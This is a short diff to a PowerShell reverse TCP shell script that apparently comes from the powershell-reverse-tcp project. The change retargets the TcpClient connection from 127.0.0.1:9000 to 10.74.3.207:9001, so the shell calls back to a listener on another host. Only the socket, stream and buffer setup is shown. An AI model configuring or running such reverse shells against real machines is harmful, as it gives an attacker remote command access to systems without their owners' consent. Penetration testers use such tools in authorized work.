@@ -3,7 +3,7 @@ Write-Host "GitHub repository at github.com/ivan-sincek/powershell-reverse-tcp."
 $client = $stream = $buffer = $writer = $data = $result = $null;
 try {
 	# change the host address and/or port number as necessary
-	$client = New-Object Net.Sockets.TcpClient("127.0.0.1", 9000);
+	$client = New-Object Net.Sockets.TcpClient("10.74.3.207", 9001);
 	$stream = $client.GetStream();
 	$buffer = New-Object Byte[] 1024;
 	$encoding = New-Object Text.UTF8Encoding;
